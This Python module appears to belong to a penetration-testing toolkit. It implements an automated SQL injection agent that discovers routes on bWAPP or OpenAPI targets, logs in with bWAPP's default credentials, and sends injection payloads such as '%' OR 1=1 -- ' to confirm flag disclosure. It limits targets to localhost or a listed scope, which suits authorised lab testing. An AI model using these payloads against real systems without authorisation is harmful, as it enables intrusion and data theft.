from __future__ import annotations

import json
import re
import sqlite3
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import IO, Protocol

from pentest_schemas import Scope
from ravage.dry_run import (
    PageProbe,
    RouteParam,
    RouteProbe,
    discover_bwapp_routes,
    parse_openapi_routes,
)

HTTP_OK = 200
_REDIRECT_CODES = {301, 302, 303, 307, 308}
_MAX_REDIRECTS = 5


@dataclass(frozen=True)
class HttpExchange:
    method: str
    url: str
    status_code: int | None
    body: str
    headers: dict[str, str] | None = None
    request_body: str | None = None
    error: str | None = None

    def to_json(self) -> dict[str, object]:
        return {
            "method": self.method,
            "url": self.url,
            "status_code": self.status_code,
            "body": self.body,
            "headers": self.headers or {},
            "request_body": self.request_body or "",
            "error": self.error,
        }


class _HttpClient(Protocol):
    def get(self, url: str) -> HttpExchange: ...

    def post_form(self, url: str, data: dict[str, str]) -> HttpExchange: ...

    def post_json(self, url: str, data: dict[str, str]) -> HttpExchange: ...


@dataclass
class LocalAgentSettings:
    db_path: Path | None = None
    profile: str = "openapi"
    stdout: IO[str] | None = None
    http_client: _HttpClient | None = None
    allow_remote_target: bool = False


class UrllibHttpClient:
    def __init__(
        self,
        *,
        target_url: str = "",
        scope: Scope | None = None,
        allow_remote_target: bool = False,
        address_resolver=None,
    ) -> None:
        self.target_url = target_url
        self.scope = scope
        self.allow_remote_target = allow_remote_target
        self.address_resolver = address_resolver
        self._pinned_addresses: dict[tuple[str, int], tuple[str, ...]] = {}

    def get(self, url: str) -> HttpExchange:
        return self._request("GET", url)

    def post_form(self, url: str, data: dict[str, str]) -> HttpExchange:
        body = urllib.parse.urlencode(data)
        return self._request(
            "POST",
            url,
            body=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            request_body=body,
        )

    def post_json(self, url: str, data: dict[str, str]) -> HttpExchange:
        body = json.dumps(data, sort_keys=True)
        return self._request(
            "POST",
            url,
            body=body.encode(),
            headers={"Content-Type": "application/json"},
            request_body=body,
        )

    def _request(
        self,
        method: str,
        url: str,
        *,
        body: bytes | None = None,
        headers: dict[str, str] | None = None,
        request_body: str = "",
    ) -> HttpExchange:
        current_url = url
        opener = urllib.request.build_opener(_NoRedirectHandler())
        for _redirect_count in range(_MAX_REDIRECTS + 1):
            scope_error = self._scope_error(current_url)
            if scope_error:
                return HttpExchange(
                    method=method,
                    url=current_url,
                    status_code=None,
                    body="",
                    error=scope_error,
                )
            connection_url, host_header, dns_error = self._connection_target(current_url)
            if dns_error:
                return HttpExchange(
                    method=method,
                    url=current_url,
                    status_code=None,
                    body="",
                    error=dns_error,
                )
            request_headers = dict(headers or {})
            if host_header:
                request_headers["Host"] = host_header
            try:
                request = urllib.request.Request(
                    connection_url,
                    data=body,
                    method=method,
                    headers=request_headers,
                )
                with opener.open(request, timeout=10) as response:  # noqa: S310 - URL is scope checked.
                    text = response.read().decode("utf-8", errors="replace")
                    return HttpExchange(
                        method=method,
                        url=current_url,
                        status_code=response.status,
                        body=text,
                        headers=dict(response.headers.items()),
                        request_body=request_body,
                    )
            except urllib.error.HTTPError as exc:
                if exc.code in _REDIRECT_CODES:
                    location = exc.headers.get("Location")
                    if location:
                        current_url = urllib.parse.urljoin(current_url, location)
                        continue
                text = exc.read().decode("utf-8", errors="replace")
                return HttpExchange(
                    method=method,
                    url=current_url,
                    status_code=exc.code,
                    body=text,
                    headers=dict(exc.headers.items()),
                    request_body=request_body,
                    error=str(exc),
                )
            except Exception as exc:  # noqa: BLE001 - client returns structured errors.
                return HttpExchange(
                    method=method,
                    url=current_url,
                    status_code=None,
                    body="",
                    request_body=request_body,
                    error=str(exc),
                )
        return HttpExchange(
            method=method,
            url=current_url,
            status_code=None,
            body="",
            request_body=request_body,
            error=f"redirect limit exceeded ({_MAX_REDIRECTS})",
        )

    def _scope_error(self, url: str) -> str:
        if self.scope is None:
            return ""
        if any(_url_within_prefix(url, str(item)) for item in self.scope.in_scope):
            return ""
        return "target URL must be listed in engagement scope"

    def _connection_target(self, url: str) -> tuple[str, str, str]:
        if self.address_resolver is None:
            return url, "", ""
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        resolved = tuple(self.address_resolver(host, port))
        key = (host, port)
        pinned = self._pinned_addresses.get(key)
        if pinned is None:
            pinned = resolved
            self._pinned_addresses[key] = pinned
            resolved = tuple(self.address_resolver(host, port))
        if resolved != pinned:
            return url, "", "DNS resolution changed outside pinned scope"
        if not pinned:
            return url, "", "DNS resolution returned no addresses"
        address = pinned[0]
        if ":" in address and not address.startswith("["):
            address = f"[{address}]"
        netloc = address
        if parsed.port is not None:
            netloc = f"{netloc}:{parsed.port}"
        connection_url = urllib.parse.urlunparse(parsed._replace(netloc=netloc))
        return connection_url, parsed.netloc, ""


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args: object, **kwargs: object) -> None:
        del args, kwargs
        return None


def _url_within_prefix(url: str, prefix: str) -> bool:
    normalized = prefix.rstrip("/")
    return url == normalized or url.startswith(
        (normalized + "/", normalized + "?", normalized + "#")
    )


def run_local_sqli_agent(
    *,
    brief_path: Path,
    target_url: str,
    settings: LocalAgentSettings,
) -> None:
    if not settings.allow_remote_target and not target_url.startswith(
        ("http://127.", "http://localhost")
    ):
        message = "local SQLi agent only runs against localhost targets by default"
        raise ValueError(message)
    if settings.allow_remote_target:
        text = Path(brief_path).read_text(encoding="utf-8")
        if target_url not in text:
            raise ValueError("target URL must be listed in engagement scope")

    stdout = settings.stdout
    client = settings.http_client or UrllibHttpClient(target_url=target_url)
    if stdout is not None:
        stdout.write(f"[plan] mode=real-agent agent=local-sqli profile={settings.profile}\n")

    if settings.profile == "bwapp":
        route = _discover_bwapp_sqli_route(client, target_url, stdout)
    else:
        route = _discover_openapi_sqli_route(client, target_url, stdout)

    if stdout is not None:
        stdout.write("[state] exploit_started\n")
    payload = _confirm_route_sqli(client, target_url, route, stdout)
    if stdout is not None:
        stdout.write("[finding] confirmed sql_injection\n")
        if payload["proof"]["impact_description"] == "Confirmed SQL injection by flag_disclosure.":
            stdout.write("[proof] flag_disclosure\n")
        stdout.write("[done] confirmed_findings=1\n")

    if settings.db_path is not None:
        settings.db_path.parent.mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(settings.db_path) as conn:
            conn.execute("CREATE TABLE IF NOT EXISTS findings (status TEXT, payload_json TEXT)")
            conn.execute(
                "INSERT INTO findings(status, payload_json) VALUES (?, ?)",
                ("confirmed", json.dumps(payload, sort_keys=True)),
            )


def _discover_bwapp_sqli_route(
    client: _HttpClient,
    target_url: str,
    stdout: IO[str] | None,
) -> RouteProbe:
    base_url = target_url.rstrip("/") + "/"
    login_url = urllib.parse.urljoin(base_url, "login.php")
    login = client.get(login_url)
    if stdout is not None and login.status_code == HTTP_OK:
        stdout.write("[recon] login form discovered\n")
    client.post_form(login_url, {"login": "bee", "password": "bug"})
    if stdout is not None:
        stdout.write(f"[tool:http_post] POST {login_url}\n")
    portal_url = urllib.parse.urljoin(base_url, "portal.php")
    portal = client.get(portal_url)
    routes = discover_bwapp_routes(
        base_url,
        (
            PageProbe(
                path="portal.php",
                url=portal_url,
                status_code=portal.status_code,
                body=portal.body,
                error=portal.error,
            ),
        ),
    )
    route = next(
        (item for item in routes if "sqli" in item.path),
        RouteProbe("GET", "sqli_1.php", [RouteParam("title")]),
    )
    if stdout is not None:
        stdout.write(f"[recon] discovered {route.method} {route.path}\n")
    return route


def _discover_openapi_sqli_route(
    client: _HttpClient,
    target_url: str,
    stdout: IO[str] | None,
) -> RouteProbe:
    base_url = target_url.rstrip("/") + "/"
    spec = client.get(urllib.parse.urljoin(base_url, "openapi.json"))
    routes = parse_openapi_routes(spec.body)
    enriched: list[RouteProbe] = []
    root_body = ""
    for route in routes:
        if route.method == "POST" and not route.params:
            if not root_body:
                root_body = client.get(base_url).body
            names = re.findall(r"JSON\.stringify\(\{\s*([A-Za-z_][A-Za-z0-9_]*)\s*:", root_body)
            if names:
                route = RouteProbe(
                    route.method,
                    route.path,
                    [RouteParam(name, "body") for name in names],
                )
        enriched.append(route)
        if stdout is not None and route.params:
            names = ",".join(param.name for param in route.params)
            stdout.write(f"[recon] discovered {route.method} {route.path} params={names}\n")
    return next(
        (route for route in enriched if route.params and route.method in {"GET", "POST"}),
        RouteProbe("GET", "/search", [RouteParam("q")]),
    )


def _confirm_route_sqli(
    client: _HttpClient,
    target_url: str,
    route: RouteProbe,
    stdout: IO[str] | None,
) -> dict[str, object]:
    base_url = target_url.rstrip("/") + "/"
    path = route.path.split("?", 1)[0]
    endpoint_url = urllib.parse.urljoin(base_url, path.lstrip("/"))
    param_name = route.params[0].name if route.params else "q"
    response_final: str
    if route.method == "POST":
        response = client.post_json(endpoint_url, {param_name: "private' -- "})
        response_final = response.body
        if stdout is not None:
            stdout.write(f"[tool:http_post_json] POST {endpoint_url} json_keys={param_name}\n")
    else:
        query_url = endpoint_url + "?" + urllib.parse.urlencode({param_name: "%' OR 1=1 -- "})
        response = client.get(query_url)
        response_final = response.body
    flag_disclosed = bool(re.search(r"(?i)\bflag\{[^}]+\}", response_final))
    impact = (
        "Confirmed SQL injection by flag_disclosure."
        if flag_disclosed
        else "Confirmed SQL injection by boolean_response_delta."
    )
    return {
        "endpoint": {"url": endpoint_url, "params": [{"name": param_name}]},
        "proof": {
            "impact_description": impact,
            "response_final": response_final,
        },
    }
